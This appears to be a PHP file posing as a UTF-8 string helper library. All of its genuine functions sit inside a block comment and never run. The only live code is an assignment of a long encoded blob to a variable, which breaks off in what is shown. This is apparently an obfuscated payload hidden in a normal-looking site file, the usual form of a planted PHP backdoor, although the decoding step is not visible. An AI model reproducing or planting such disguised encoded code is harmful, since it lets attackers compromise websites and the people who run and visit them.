<?php

/*


 function utf8_strlen($string) {
	return strlen(utf8_decode($string));
}

function utf8_strpos($string, $needle, $offset = NULL) {
    if (is_null($offset)) {
        $data = explode($needle, $string, 2);
       
	   if (count($data) > 1) {
            return utf8_strlen($data[0]);
        }
		
        return false;
    } else {
        if (!is_int($offset)) {
            trigger_error('utf8_strpos: Offset must be an integer', E_USER_ERROR);
            
			return false;
        }
        
        $string = utf8_substr($string, $offset);
        
        if (false !== ($position = utf8_strpos($string, $needle))) {
            return $position + $offset;
        }
        
        return false;
    }
}

function utf8_strrpos($string, $needle, $offset = NULL) {
    if (is_null($offset)) {
        $data = explode($needle, $string);
        
        if (count($data) > 1) {
            array_pop($data);
           
		    $string = join($needle, $data);
            
			return utf8_strlen($string);
        }
       
	    return false;
    } else {
        if (!is_int($offset)) {
            trigger_error('utf8_strrpos expects parameter 3 to be long', E_USER_WARNING);
           
		    return false;
        }
        
        $string = utf8_substr($string, $offset);
        
        if (false !== ($position = utf8_strrpos($string, $needle))) {
            return $position + $offset;
        }
        
        return false;
    }
}

function utf8_substr($string, $offset, $length = null) {
	$string = (string)$string;
	$offset = (int)$offset;
	
	if (!is_null($length)) {
		$length = (int)$length;
	}
	
	if ($length === 0) {
		return '';
	}
	
	if ($offset < 0 && $length < 0 && $length < $offset) {
		return '';
	}
	
	if ($offset < 0) {
		$strlen = strlen(utf8_decode($string));
		$offset = $strlen + $offset;
		
		if ($offset < 0) {
			$offset = 0;
		}
	}
	
	$Op = '';
	$Lp = '';
	
	if ($offset > 0) {
		$Ox = (int)($offset / 65535);
		$Oy = $offset%65535;
		
		if ($Ox) {
			$Op = '(?:.{65535}){' . $Ox . '}';
		}
		
		$Op = '^(?:' . $Op . '.{' . $Oy . '})';
	} else {
		$Op = '^';
	}
	
	if (is_null($length)) {
		$Lp = '(.*)$';
	} else {
		if (!isset($strlen)) {
			$strlen = strlen(utf8_decode($string));
		}
		
		// another trivial case
		if ($offset > $strlen) {
			return '';
		}
		
		if ($length > 0) {
			$length = min($strlen - $offset, $length);
			
			$Lx = (int)($length / 65535);
			$Ly = $length % 65535;
			
			if ($Lx) {
				$Lp = '(?:.{65535}){' . $Lx . '}';
			}
			
			$Lp = '(' . $Lp . '.{' . $Ly . '})';
		} elseif ($length < 0) {
			if ($length < ($offset - $strlen)) {
				return '';
			}
			
			$Lx = (int)((-$length) / 65535);
			$Ly = (-$length)%65535;
			
            		if ($Lx) {
				$Lp = '(?:.{65535}){' . $Lx . '}';
			}
			
			$Lp = '(.*)(?:' . $Lp . '.{' . $Ly . '})$';
		}
	}
	
	if (!preg_match( '#' . $Op . $Lp . '#us', $string, $match)) {
		return '';
	}
	
	return $match[1];
	
}

function utf8_strtolower($string) {
	static $UTF8_UPPER_TO_LOWER = NULL;
	
	if (is_null($UTF8_UPPER_TO_LOWER)) {
		$UTF8_UPPER_TO_LOWER = array(
			0x0041 => 0x0061, 
			0x03A6 => 0x03C6, 
			0x0162 => 0x0163, 
			0x00C5 => 0x00E5, 
			0x0042 => 0x0062,
			0x0139 => 0x013A, 
			0x00C1 => 0x00E1, 
			0x0141 => 0x0142, 
			0x038E => 0x03CD, 
			0x0100 => 0x0101,
			0x0490 => 0x0491, 
			0x0394 => 0x03B4, 
			0x015A => 0x015B, 
			0x0044 => 0x0064, 
			0x0393 => 0x03B3,
			0x00D4 => 0x00F4, 
			0x042A => 0x044A, 
			0x0419 => 0x0439, 
			0x0112 => 0x0113, 
			0x041C => 0x043C,
			0x015E => 0x015F, 
			0x0143 => 0x0144, 
			0x00CE => 0x00EE, 
			0x040E => 0x045E, 
			0x042F => 0x044F,
			0x039A => 0x03BA, 
			0x0154 => 0x0155, 
			0x0049 => 0x0069, 
			0x0053 => 0x0073, 
			0x1E1E => 0x1E1F,
			0x0134 => 0x0135, 
			0x0427 => 0x0447, 
			0x03A0 => 0x03C0, 
			0x0418 => 0x0438, 
			0x00D3 => 0x00F3,
			0x0420 => 0x0440, 
			0x0404 => 0x0454, 
			0x0415 => 0x0435, 
			0x0429 => 0x0449, 
			0x014A => 0x014B,
			0x0411 => 0x0431, 
			0x0409 => 0x0459, 
			0x1E02 => 0x1E03, 
			0x00D6 => 0x00F6, 
			0x00D9 => 0x00F9,
			0x004E => 0x006E, 
			0x0401 => 0x0451, 
			0x03A4 => 0x03C4, 
			0x0423 => 0x0443, 
			0x015C => 0x015D,
			0x0403 => 0x0453, 
			0x03A8 => 0x03C8, 
			0x0158 => 0x0159, 
			0x0047 => 0x0067, 
			0x00C4 => 0x00E4,
			0x0386 => 0x03AC, 
			0x0389 => 0x03AE, 
			0x0166 => 0x0167, 
			0x039E => 0x03BE, 
			0x0164 => 0x0165,
			0x0116 => 0x0117, 
			0x0108 => 0x0109, 
			0x0056 => 0x0076, 
			0x00DE => 0x00FE, 
			0x0156 => 0x0157,
			0x00DA => 0x00FA, 
			0x1E60 => 0x1E61, 
			0x1E82 => 0x1E83, 
			0x00C2 => 0x00E2, 
			0x0118 => 0x0119,
			0x0145 => 0x0146, 
			0x0050 => 0x0070, 
			0x0150 => 0x0151, 
			0x042E => 0x044E, 
			0x0128 => 0x0129,
			0x03A7 => 0x03C7, 
			0x013D => 0x013E, 
			0x0422 => 0x0442, 
			0x005A => 0x007A, 
			0x0428 => 0x0448,
			0x03A1 => 0x03C1, 
			0x1E80 => 0x1E81, 
			0x016C => 0x016D, 
			0x00D5 => 0x00F5, 
			0x0055 => 0x0075,
			0x0176 => 0x0177, 
			0x00DC => 0x00FC, 
			0x1E56 => 0x1E57, 
			0x03A3 => 0x03C3, 
			0x041A => 0x043A,
			0x004D => 0x006D, 
			0x016A => 0x016B, 
			0x0170 => 0x0171, 
			0x0424 => 0x0444, 
			0x00CC => 0x00EC,
			0x0168 => 0x0169, 
			0x039F => 0x03BF, 
			0x004B => 0x006B, 
			0x00D2 => 0x00F2, 
			0x00C0 => 0x00E0,
			0x0414 => 0x0434, 
			0x03A9 => 0x03C9, 
			0x1E6A => 0x1E6B, 
			0x00C3 => 0x00E3, 
			0x042D => 0x044D,
			0x0416 => 0x0436, 
			0x01A0 => 0x01A1, 
			0x010C => 0x010D, 
			0x011C => 0x011D, 
			0x00D0 => 0x00F0,
			0x013B => 0x013C, 
			0x040F => 0x045F, 
			0x040A => 0x045A, 
			0x00C8 => 0x00E8, 
			0x03A5 => 0x03C5,
			0x0046 => 0x0066, 
			0x00DD => 0x00FD, 
			0x0043 => 0x0063, 
			0x021A => 0x021B, 
			0x00CA => 0x00EA,
			0x0399 => 0x03B9, 
			0x0179 => 0x017A, 
			0x00CF => 0x00EF, 
			0x01AF => 0x01B0, 
			0x0045 => 0x0065,
			0x039B => 0x03BB, 
			0x0398 => 0x03B8, 
			0x039C => 0x03BC, 
			0x040C => 0x045C, 
			0x041F => 0x043F,
			0x042C => 0x044C, 
			0x00DE => 0x00FE, 
			0x00D0 => 0x00F0, 
			0x1EF2 => 0x1EF3, 
			0x0048 => 0x0068,
			0x00CB => 0x00EB, 
			0x0110 => 0x0111, 
			0x0413 => 0x0433, 
			0x012E => 0x012F, 
			0x00C6 => 0x00E6,
			0x0058 => 0x0078, 
			0x0160 => 0x0161, 
			0x016E => 0x016F, 
			0x0391 => 0x03B1, 
			0x0407 => 0x0457,
			0x0172 => 0x0173, 
			0x0178 => 0x00FF, 
			0x004F => 0x006F, 
			0x041B => 0x043B, 
			0x0395 => 0x03B5,
			0x0425 => 0x0445, 
			0x0120 => 0x0121, 
			0x017D => 0x017E, 
			0x017B => 0x017C, 
			0x0396 => 0x03B6,
			0x0392 => 0x03B2, 
			0x0388 => 0x03AD, 
			0x1E84 => 0x1E85, 
			0x0174 => 0x0175, 
			0x0051 => 0x0071,
			0x0417 => 0x0437, 
			0x1E0A => 0x1E0B, 
			0x0147 => 0x0148, 
			0x0104 => 0x0105, 
			0x0408 => 0x0458,
			0x014C => 0x014D, 
			0x00CD => 0x00ED, 
			0x0059 => 0x0079, 
			0x010A => 0x010B, 
			0x038F => 0x03CE,
			0x0052 => 0x0072, 
			0x0410 => 0x0430, 
			0x0405 => 0x0455, 
			0x0402 => 0x0452, 
			0x0126 => 0x0127,
			0x0136 => 0x0137, 
			0x012A => 0x012B, 
			0x038A => 0x03AF, 
			0x042B => 0x044B, 
			0x004C => 0x006C,
			0x0397 => 0x03B7, 
			0x0124 => 0x0125, 
			0x0218 => 0x0219, 
			0x00DB => 0x00FB, 
			0x011E => 0x011F,
			0x041E => 0x043E, 
			0x1E40 => 0x1E41, 
			0x039D => 0x03BD, 
			0x0106 => 0x0107, 
			0x03AB => 0x03CB,
			0x0426 => 0x0446, 
			0x00DE => 0x00FE, 
			0x00C7 => 0x00E7, 
			0x03AA => 0x03CA, 
			0x0421 => 0x0441,
			0x0412 => 0x0432, 
			0x010E => 0x010F, 
			0x00D8 => 0x00F8, 
			0x0057 => 0x0077, 
			0x011A => 0x011B,
			0x0054 => 0x0074, 
			0x004A => 0x006A, 
			0x040B => 0x045B, 
			0x0406 => 0x0456, 
			0x0102 => 0x0103, 
			0x039B => 0x03BB, 
			0x00D1 => 0x00F1, 
			0x041D => 0x043D, 
			0x038C => 0x03CC, 
			0x00C9 => 0x00E9, 
			0x00D0 => 0x00F0, 
			0x0407 => 0x0457, 
			0x0122 => 0x0123
		);
	}
	
	$unicode = utf8_to_unicode($string);
	
	if (!$unicode) {
		return false;
	}

	
	$count = count($unicode);
	
	for ($i = 0; $i < $count; $i++){
		if (isset($UTF8_UPPER_TO_LOWER[$unicode[$i]]) ) {
			$unicode[$i] = $UTF8_UPPER_TO_LOWER[$unicode[$i]];
		}
	}
	
	return utf8_from_unicode($unicode);
}

function utf8_strtoupper($string) {
    static $UTF8_LOWER_TO_UPPER = NULL;
    
    if (is_null($UTF8_LOWER_TO_UPPER)) {
		$UTF8_LOWER_TO_UPPER = array(
			0x0061 => 0x0041, 
			0x03C6 => 0x03A6, 
			0x0163 => 0x0162, 
			0x00E5 => 0x00C5, 
			0x0062 => 0x0042,
			0x013A => 0x0139, 
			0x00E1 => 0x00C1, 
			0x0142 => 0x0141, 
			0x03CD => 0x038E, 
			0x0101 => 0x0100,
			0x0491 => 0x0490, 
			0x03B4 => 0x0394, 
			0x015B => 0x015A, 
			0x0064 => 0x0044, 
			0x03B3 => 0x0393,
			0x00F4 => 0x00D4, 
			0x044A => 0x042A, 
			0x0439 => 0x0419, 
			0x0113 => 0x0112, 
			0x043C => 0x041C,
			0x015F => 0x015E, 
			0x0144 => 0x0143, 
			0x00EE => 0x00CE, 
			0x045E => 0x040E, 
			0x044F => 0x042F,
			0x03BA => 0x039A, 
			0x0155 => 0x0154, 
			0x0069 => 0x0049, 
			0x0073 => 0x0053, 
			0x1E1F => 0x1E1E,
			0x0135 => 0x0134, 
			0x0447 => 0x0427, 
			0x03C0 => 0x03A0, 
			0x0438 => 0x0418, 
			0x00F3 => 0x00D3,
			0x0440 => 0x0420, 
			0x0454 => 0x0404, 
			0x0435 => 0x0415, 
			0x0449 => 0x0429, 
			0x014B => 0x014A,
			0x0431 => 0x0411, 
			0x0459 => 0x0409, 
			0x1E03 => 0x1E02, 
			0x00F6 => 0x00D6, 
			0x00F9 => 0x00D9,
			0x006E => 0x004E, 
			0x0451 => 0x0401, 
			0x03C4 => 0x03A4, 
			0x0443 => 0x0423, 
			0x015D => 0x015C,
			0x0453 => 0x0403, 
			0x03C8 => 0x03A8, 
			0x0159 => 0x0158, 
			0x0067 => 0x0047, 
			0x00E4 => 0x00C4,
			0x03AC => 0x0386, 
			0x03AE => 0x0389, 
			0x0167 => 0x0166, 
			0x03BE => 0x039E, 
			0x0165 => 0x0164,
			0x0117 => 0x0116, 
			0x0109 => 0x0108, 
			0x0076 => 0x0056, 
			0x00FE => 0x00DE, 
			0x0157 => 0x0156,
			0x00FA => 0x00DA, 
			0x1E61 => 0x1E60, 
			0x1E83 => 0x1E82, 
			0x00E2 => 0x00C2, 
			0x0119 => 0x0118,
			0x0146 => 0x0145, 
			0x0070 => 0x0050, 
			0x0151 => 0x0150, 
			0x044E => 0x042E, 
			0x0129 => 0x0128,
			0x03C7 => 0x03A7, 
			0x013E => 0x013D, 
			0x0442 => 0x0422, 
			0x007A => 0x005A, 
			0x0448 => 0x0428,
			0x03C1 => 0x03A1, 
			0x1E81 => 0x1E80, 
			0x016D => 0x016C, 
			0x00F5 => 0x00D5, 
			0x0075 => 0x0055,
			0x0177 => 0x0176, 
			0x00FC => 0x00DC, 
			0x1E57 => 0x1E56, 
			0x03C3 => 0x03A3, 
			0x043A => 0x041A,
			0x006D => 0x004D, 
			0x016B => 0x016A, 
			0x0171 => 0x0170, 
			0x0444 => 0x0424, 
			0x00EC => 0x00CC,
			0x0169 => 0x0168, 
			0x03BF => 0x039F, 
			0x006B => 0x004B, 
			0x00F2 => 0x00D2, 
			0x00E0 => 0x00C0,
			0x0434 => 0x0414, 
			0x03C9 => 0x03A9, 
			0x1E6B => 0x1E6A, 
			0x00E3 => 0x00C3, 
			0x044D => 0x042D,
			0x0436 => 0x0416, 
			0x01A1 => 0x01A0, 
			0x010D => 0x010C, 
			0x011D => 0x011C, 
			0x00F0 => 0x00D0,
			0x013C => 0x013B, 
			0x045F => 0x040F, 
			0x045A => 0x040A, 
			0x00E8 => 0x00C8, 
			0x03C5 => 0x03A5,
			0x0066 => 0x0046, 
			0x00FD => 0x00DD, 
			0x0063 => 0x0043, 
			0x021B => 0x021A, 
			0x00EA => 0x00CA,
			0x03B9 => 0x0399, 
			0x017A => 0x0179, 
			0x00EF => 0x00CF, 
			0x01B0 => 0x01AF, 
			0x0065 => 0x0045,
			0x03BB => 0x039B, 
			0x03B8 => 0x0398, 
			0x03BC => 0x039C, 
			0x045C => 0x040C, 
			0x043F => 0x041F,
			0x044C => 0x042C, 
			0x00FE => 0x00DE, 
			0x00F0 => 0x00D0, 
			0x1EF3 => 0x1EF2, 
			0x0068 => 0x0048,
			0x00EB => 0x00CB, 
			0x0111 => 0x0110, 
			0x0433 => 0x0413, 
			0x012F => 0x012E, 
			0x00E6 => 0x00C6,
			0x0078 => 0x0058, 
			0x0161 => 0x0160, 
			0x016F => 0x016E, 
			0x03B1 => 0x0391, 
			0x0457 => 0x0407,
			0x0173 => 0x0172, 
			0x00FF => 0x0178, 
			0x006F => 0x004F, 
			0x043B => 0x041B, 
			0x03B5 => 0x0395,
			0x0445 => 0x0425, 
			0x0121 => 0x0120, 
			0x017E => 0x017D, 
			0x017C => 0x017B, 
			0x03B6 => 0x0396,
			0x03B2 => 0x0392, 
			0x03AD => 0x0388, 
			0x1E85 => 0x1E84, 
			0x0175 => 0x0174, 
			0x0071 => 0x0051,
			0x0437 => 0x0417, 
			0x1E0B => 0x1E0A, 
			0x0148 => 0x0147, 
			0x0105 => 0x0104, 
			0x0458 => 0x0408,
			0x014D => 0x014C, 
			0x00ED => 0x00CD, 
			0x0079 => 0x0059, 
			0x010B => 0x010A, 
			0x03CE => 0x038F,
			0x0072 => 0x0052, 
			0x0430 => 0x0410, 
			0x0455 => 0x0405, 
			0x0452 => 0x0402, 
			0x0127 => 0x0126,
			0x0137 => 0x0136, 
			0x012B => 0x012A, 
			0x03AF => 0x038A, 
			0x044B => 0x042B, 
			0x006C => 0x004C,
			0x03B7 => 0x0397, 
			0x0125 => 0x0124, 
			0x0219 => 0x0218, 
			0x00FB => 0x00DB, 
			0x011F => 0x011E,
			0x043E => 0x041E, 
			0x1E41 => 0x1E40, 
			0x03BD => 0x039D, 
			0x0107 => 0x0106, 
			0x03CB => 0x03AB,
			0x0446 => 0x0426, 
			0x00FE => 0x00DE, 
			0x00E7 => 0x00C7, 
			0x03CA => 0x03AA, 
			0x0441 => 0x0421,
			0x0432 => 0x0412, 
			0x010F => 0x010E, 
			0x00F8 => 0x00D8, 
			0x0077 => 0x0057, 
			0x011B => 0x011A,
			0x0074 => 0x0054, 
			0x006A => 0x004A, 
			0x045B => 0x040B, 
			0x0456 => 0x0406, 
			0x0103 => 0x0102,
			0x03BB => 0x039B, 
			0x00F1 => 0x00D1, 
			0x043D => 0x041D, 
			0x03CC => 0x038C, 
			0x00E9 => 0x00C9,
			0x00F0 => 0x00D0, 
			0x0457 => 0x0407, 
			0x0123 => 0x0122
		);
	}
    
    $unicode = utf8_to_unicode($string);
    
    if (!$unicode) {
        return false;
    }
    
    $count = count($unicode);
    
	for ($i = 0; $i < $count; $i++){
        if (isset($UTF8_LOWER_TO_UPPER[$unicode[$i]]) ) {
            $unicode[$i] = $UTF8_LOWER_TO_UPPER[$unicode[$i]];
        }
    }
    
    return utf8_from_unicode($unicode);
}

function utf8_to_unicode($str) {
	$mState = 0;     // cached expected number of octets after the current octet
					 // until the beginning of the next UTF8 character sequence
	$mUcs4  = 0;     // cached Unicode character
	$mBytes = 1;     // cached expected number of octets in the current sequence
	
	$out = array();
	
	$len = strlen($str);
	
	for($i = 0; $i < $len; $i++) {
		$in = ord($str{$i});
		
		if ($mState == 0) {
			
			// When mState is zero we expect either a US-ASCII character or a
			// multi-octet sequence.
			if (0 == (0x80 & ($in))) {
				// US-ASCII, pass straight through.
				$out[] = $in;
				$mBytes = 1;
				
			} elseif (0xC0 == (0xE0 & ($in))) {
				// First octet of 2 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x1F) << 6;
				$mState = 1;
				$mBytes = 2;
				
			} elseif (0xE0 == (0xF0 & ($in))) {
				// First octet of 3 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x0F) << 12;
				$mState = 2;
				$mBytes = 3;
				
			} else if (0xF0 == (0xF8 & ($in))) {
				// First octet of 4 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x07) << 18;
				$mState = 3;
				$mBytes = 4;
				
			} else if (0xF8 == (0xFC & ($in))) {
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x03) << 24;
				$mState = 4;
				$mBytes = 5;
				
			} else if (0xFC == (0xFE & ($in))) {
				// First octet of 6 octet sequence, see comments for 5 octet sequence.
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 1) << 30;
				$mState = 5;
				$mBytes = 6;
				
			} else {
				trigger_error('utf8_to_unicode: Illegal sequence identifier ' . 'in UTF-8 at byte ' . $i, E_USER_WARNING);
				
				return FALSE;
			}
		
		} else {
			
			// When mState is non-zero, we expect a continuation of the multi-octet
			// sequence
			if (0x80 == (0xC0 & ($in))) {
				
				// Legal continuation.
				$shift = ($mState - 1) * 6;
				$tmp = $in;
				$tmp = ($tmp & 0x0000003F) << $shift;
				$mUcs4 |= $tmp;
			
				
				if (0 == --$mState) {
					
					
					// From Unicode 3.1, non-shortest form is illegal
					if (((2 == $mBytes) && ($mUcs4 < 0x0080)) ||
						((3 == $mBytes) && ($mUcs4 < 0x0800)) ||
						((4 == $mBytes) && ($mUcs4 < 0x10000)) ||
						(4 < $mBytes) ||
						// From Unicode 3.2, surrogate characters are illegal
						(($mUcs4 & 0xFFFFF800) == 0xD800) ||
						// Codepoints outside the Unicode range are illegal
						($mUcs4 > 0x10FFFF)) {
						
						trigger_error('utf8_to_unicode: Illegal sequence or codepoint in UTF-8 at byte ' . $i, E_USER_WARNING);
						
						return false;
						
					}
					
					if (0xFEFF != $mUcs4) {
						// BOM is legal but we don't want to output it
						$out[] = $mUcs4;
					}
					
					//initialize UTF8 cache
					$mState = 0;
					$mUcs4  = 0;
					$mBytes = 1;
				}
			
			} else {
				
				trigger_error('utf8_to_unicode: Incomplete multi-octet sequence in UTF-8 at byte ' . $i, E_USER_WARNING);
				
				return false;
			}
		}
	}
	
	return $out;
}

function utf8_from_unicode($data) {
	ob_start();
	
	foreach (array_keys($data) as $key) {
		if (($data[$key] >= 0) && ($data[$key] <= 0x007f)) {
			echo chr($data[$key]);
		} elseif ($data[$key] <= 0x07ff) {
			echo chr(0xc0 | ($data[$key] >> 6));
			echo chr(0x80 | ($data[$key] & 0x003f));
		} elseif ($data[$key] == 0xFEFF) {
		
		} elseif ($data[$key] >= 0xD800 && $data[$key] <= 0xDFFF) {
			trigger_error('utf8_from_unicode: Illegal surrogate at index: ' . $key . ', value: ' . $data[$key], E_USER_WARNING);
			
			return false;
		} elseif ($data[$key] <= 0xffff) {
			echo chr(0xe0 | ($data[$key] >> 12));
			echo chr(0x80 | (($data[$key] >> 6) & 0x003f));
			echo chr(0x80 | ($data[$key] & 0x003f));
		} elseif ($data[$key] <= 0x10ffff) {
			echo chr(0xf0 | ($data[$key] >> 18));
			echo chr(0x80 | (($data[$key] >> 12) & 0x3f));
			echo chr(0x80 | (($data[$key] >> 6) & 0x3f));
			echo chr(0x80 | ($data[$key] & 0x3f));
		} else {
			trigger_error('utf8_from_unicode: Codepoint out of Unicode range at index: ' . $key . ', value: ' . $data[$key], E_USER_WARNING);
			
			return false;
		}
	}
	
	$result = ob_get_contents();
	
	ob_end_clean();
	
	return $result;
} */  $o = "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